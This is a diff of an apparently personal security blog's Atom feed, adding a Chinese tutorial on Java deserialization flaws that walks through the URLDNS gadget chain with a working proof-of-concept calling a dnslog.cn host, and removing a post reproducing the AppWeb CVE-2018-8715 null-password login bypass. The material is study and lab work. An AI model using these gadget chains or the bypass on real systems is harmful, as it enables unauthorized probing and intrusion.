@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://www.yyxyy.xyz/</id>
     <title>Yyx</title>
-    <updated>2023-03-19T07:37:33.245Z</updated>
+    <updated>2023-03-19T08:03:57.115Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://www.yyxyy.xyz/"/>
     <link rel="self" href="https://www.yyxyy.xyz/atom.xml"/>
@@ -10,6 +10,220 @@
     <logo>https://www.yyxyy.xyz/images/avatar.png</logo>
     <icon>https://www.yyxyy.xyz/favicon.ico</icon>
     <rights>All rights reserved 2023, Yyx</rights>
+    <entry>
+        <title type="html"><![CDATA[JAVA序列化与反序列化]]></title>
+        <id>https://www.yyxyy.xyz/post/java-xu-lie-hua-yu-fan-xu-lie-hua/</id>
+        <link href="https://www.yyxyy.xyz/post/java-xu-lie-hua-yu-fan-xu-lie-hua/">
+        </link>
+        <updated>2022-03-03T03:09:54.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="概述">概述</h1>
+<p>大概意思：</p>
+<pre><code class="language-c">序列化：对象 -&gt; 字符串
+反序列化：字符串 -&gt; 对象
+</code></pre>
+<h1 id="几种创建的序列化和反序列化协议">几种创建的序列化和反序列化协议</h1>
+<ul>
+<li>XML&amp;SOAP</li>
+<li>JSON</li>
+<li>Protobuf</li>
+</ul>
+<h1 id="序列化与反序列化基本实现">序列化与反序列化基本实现</h1>
+<p>将序列化功能封装进了 <strong>serialize</strong> 这个方法里面，在序列化当中，我们通过这个 FileOutputStream 输出流对象，将序列化的对象输出到 ser.bin 当中。再调用 oos 的 writeObject 方法，将对象进行序列化操作。</p>
+<h2 id="serialization"><strong>Serialization</strong></h2>
+<pre><code class="language-java">ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+oos.writeObject(obj);
+</code></pre>
+<h2 id="unserialize"><strong>Unserialize</strong></h2>
+<pre><code class="language-java">ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+Object obj = ois.readObject();
+</code></pre>
+<h1 id="序列化的安全问题">序列化的安全问题</h1>
+<h2 id="重要函数">重要函数</h2>
+<p>writeObject 和 readObject</p>
+<h2 id="存在安全漏洞的形式">存在安全漏洞的形式</h2>
+<h3 id="0x01-入口类的-readobject-直接调用危险方法">0x01 入口类的 readObject 直接调用危险方法</h3>
+<h3 id="0x02-入口参数中包含可控类该类有危险方法readobject-时调用">0x02 入口参数中包含可控类，该类有危险方法，readObject 时调用</h3>
+<h3 id="0x03-入口类参数中包含可控类该类又调用其他有危险方法的类readobject-时调用">0x03 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用</h3>
+<h3 id="0x04-构造函数静态代码块等类加载时隐式执行">0x04 构造函数/静态代码块等类加载时隐式执行</h3>
+<h2 id="漏洞的攻击路线">漏洞的攻击路线</h2>
+<p>首先的攻击前提：继承 Serializable</p>
+<p>入口类：source （重写 readObject 调用常见的函数；参数类型宽泛，比如可以传入一个类作为参数；最好 jdk 自带）</p>
+<p>找到入口类之后要找调用链 gadget chain 相同名称、相同类型</p>
+<p>执行类 sink （RCE SSRF 写文件等等）比如 exec 这种函数</p>
+<h1 id="urldns-分析">URLDNS 分析</h1>
+<p>urldns 地址</p>
+<p>https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</p>
+<p>利用链</p>
+<pre><code class="language-java">Gadget Chain:     
+    HashMap.readObject()         
+    	HashMap.putVal()             
+    		HashMap.hash()                 
+    			URL.hashCode()
+</code></pre>
+<p>先看 Hashmap 的readobject方法</p>
+<pre><code class="language-java">//还有一堆省略了
+for (int i = 0; i &lt; mappings; i++) {
+    @SuppressWarnings(&quot;unchecked&quot;)
+        K key = (K) s.readObject();
+    @SuppressWarnings(&quot;unchecked&quot;)
+        V value = (V) s.readObject();
+    putVal(hash(key), key, value, false, false);
+}
+</code></pre>
+<p>跟进hash函数</p>
+<pre><code class="language-plain">static final int hash(Object key) {
+    int h;
+    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);
+}
+</code></pre>
+<p>这里使用的是key.hashcode。于是需要寻找key来源。</p>
+<p>在POC里面URL需要使用hashmap.put()方法，</p>
+<pre><code class="language-java">hashmap.put(new URL(&quot;DNS地址以&quot;),1);
+</code></pre>
+<p>跟进put方法。</p>
+<pre><code class="language-plain">public V put(K key, V value) {
+    return putVal(hash(key), key, value, false, true);
+}
+</code></pre>
+<p>发现调用了hash函数，hash里面的key便是传的URL参数。</p>
+<p>跟进URL里面查找hashcode().</p>
+<pre><code class="language-java">public synchronized int hashCode() {
+    if (hashCode != -1)
+        return hashCode;
+
+    hashCode = handler.hashCode(this);
+    return hashCode;
+}
+</code></pre>
+<p>继续跟进handler。</p>
+<pre><code class="language-java">transient URLStreamHandler handler;
+</code></pre>
+<p>继续跟进URLStreamHandler，寻找hashcode。</p>
+<pre><code class="language-java">protected int hashCode(URL u) {
+    int h = 0;
+
+// Generate the protocol part.
+String protocol = u.getProtocol();
+if (protocol != null)
+    h += protocol.hashCode();
+
+// Generate the host part.
+InetAddress addr = getHostAddress(u);
+if (addr != null) {
+    h += addr.hashCode();
+} else {
+    String host = u.getHost();
+    if (host != null)
+        h += host.toLowerCase().hashCode();
+}
+</code></pre>
+<p>继续跟进hostAddress()</p>
+<pre><code class="language-plain">protected InetAddress getHostAddress(URL u) {
+    return u.getHostAddress();
+}
+</code></pre>
+<p>继续跟进</p>
+<pre><code class="language-plain">synchronized InetAddress getHostAddress() {
+    if (hostAddress != null) {
+        return hostAddress;
+    }
+
+    if (host == null || host.isEmpty()) {
+        return null;
+    }
+    try {
+        hostAddress = InetAddress.getByName(host);
+    } catch (UnknownHostException | SecurityException ex) {
+        return null;
+    }
+    return hostAddress;
+}
+</code></pre>
+<p>这⾥ InetAddress.getByName(host) 的作⽤是根据主机名，获取其 IP 地址，在⽹络上其实就是⼀次 DNS 查询。到这⾥就不必要再跟了。</p>
+<h2 id="利用链">利用链</h2>
+<ol>
+<li>HashMap-&gt;readObject()</li>
+<li>HashMap-&gt;hash()</li>
+<li>URL-&gt;hashCode()</li>
+<li>URLStreamHandler-&gt;hashCode()</li>
+<li>URLStreamHandler-&gt;getHostAddress()</li>
+<li>InetAddress-&gt;getByName()</li>
+</ol>
+<h2 id="urldns-反序列化利用链的-poc">URLDNS 反序列化利用链的 POC</h2>
+<pre><code class="language-plain">package org.example;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.net.URL; import java.util.HashMap;
+public class URLDNS {
+    public static void main(String[] args) throws Exception {
+        // new一个 HashMap 出来，这是此 gadget 的起点；
+        // 然后设置需要访问的url
+        HashMap hashMap = new HashMap();
+        URL url = new URL(&quot;http://aer4rt.dnslog.cn&quot;);
+        // 将私有的 hashCode 设置为可以更改
+        Field field = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);
+        field.setAccessible(true);
+        // 设置 url 对象内的 hashCode 为 0x123
+        field.set(url, 0x123);
+        // 将键值存入hashMap
+        hashMap.put(url, &quot;qqq&quot;);
+        // 设置 url 对象内的 hashCode 为 -1（不可更改）
+        field.set(url, -1);
+        // 序列化，写入文件
+        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./out.ser&quot;));
+        outputStream.writeObject(hashMap);
+        outputStream.close();
+        // 反序列化，读取文件
+        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./out.ser&quot;));
+        inputStream.readObject();
+        inputStream.close();
+    }
+}
+</code></pre>
+<h2 id="注意">注意</h2>
+<p>我们需要注意hashmap中的put方法。</p>
+<pre><code class="language-java">public V put(K key, V value) {
+    return putVal(hash(key), key, value, false, true);
+}
+</code></pre>
+<p>在URL对象再初始化之后的hashCode默认为-1。也就是说生成payload的过程中，如果不做任何修改就直接把URL对象放入HashMap是在本地触发一次DNS查询的。</p>
+<p>注释field.set(url, 0x123);发现默认为-1</p>
+<p><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/image.png" alt="img" loading="lazy"><br>
+这时候hashCode默认为-1，然后就会进入hash(key)触发DNS查询。这就会混淆是你本地的查询还是对方机器的查询的DNS。在put之前修改个hashCode，就可以避免触发。</p>
+<p>而在put了之后，需要field.set(url, -1);把这个字段修改回来，去触发DNS请求。</p>
+<h2 id="查看yso做法">查看yso做法</h2>
+<pre><code class="language-java">public class URLDNS implements ObjectPayload&lt;Object&gt; { 
+    public Object getObject(final String url) throws Exception { 
+        //Avoid DNS resolution during payload creation 
+        //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload. 
+        URLStreamHandler handler = new SilentURLStreamHandler(); 
+        HashMap ht = new HashMap(); 
+        // HashMap that will contain the URL 
+        URL u = new URL(null, url, handler); // URL to use as the Key 
+        ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. 
+        Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. 
+        return ht; 
+    } 
+    public static void main(final String[] args) throws Exception { 
+        PayloadRunner.run(URLDNS.class, args); 
+    } 
+    static class SilentURLStreamHandler extends URLStreamHandler { 
+        protected URLConnection openConnection(URL u) throws IOException { 
+            return null; 
+        } 
+        protected synchronized InetAddress getHostAddress(URL u) { 
+            return null; 
+        } 
+    } 
+}
+</code></pre>
+<p>它代码中没有使用 field.set(url, 0x123); ，但是自定了一个类为 SilentURLStreamHandler，这个类重写了getHostAddress() 函数，重写后的 getHostAddress() 是个空的，也就导致在本地生成 poc 的时候不会有 DNS 请求。</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[Springboot 学习]]></title>
         <id>https://www.yyxyy.xyz/post/springboot-xue-xi/</id>
@@ -693,37 +907,6 @@ docker ps -a
  
 docker-compose down        //要进入另一个漏洞靶场，则先要结束掉当前漏洞靶场
 </code></pre>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[CVE-2018-8715复现]]></title>
-        <id>https://www.yyxyy.xyz/post/cve-2018-8715-fu-xian/</id>
-        <link href="https://www.yyxyy.xyz/post/cve-2018-8715-fu-xian/">
-        </link>
-        <updated>2021-06-06T03:57:21.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="cve-2018-8715复现">CVE-2018-8715复现</h1>
-<h4 id="前提条件">前提条件</h4>
-<p>首先得已知一个用户名</p>
-<h4 id="appweb简介">AppWeb简介</h4>
-<p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p>
-<p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p>
-<ul>
-<li>1.basic 传统HTTP基础认证</li>
-<li>2.digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li>
-<li>3.form 表单认证</li>
-</ul>
-<h4 id="漏洞描述">漏洞描述</h4>
-<p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p>
-<h4 id="漏洞复现">漏洞复现</h4>
-<p>0x1 访问目标站</p>
-<p>输入已知账号，然后抓包。</p>
-<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2018-8715/1.png" alt="" loading="lazy"></figure>
-<p>0x2 修改请求方式，添加session</p>
-<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2018-8715/2.png" alt="" loading="lazy"></figure>
-<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2018-8715/3.png" alt="" loading="lazy"></figure>
-<p>这一步拿到session我们也可以直接在浏览器添加cookie，也能完成。</p>
-<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2018-8715/4.png" alt="" loading="lazy"></figure>
-<p>[+]具体参考链接<a href="https://www.freebuf.com/column/221660.html">https://www.freebuf.com/column/221660.html</a></p>
 ]]></content>
     </entry>
 </feed>
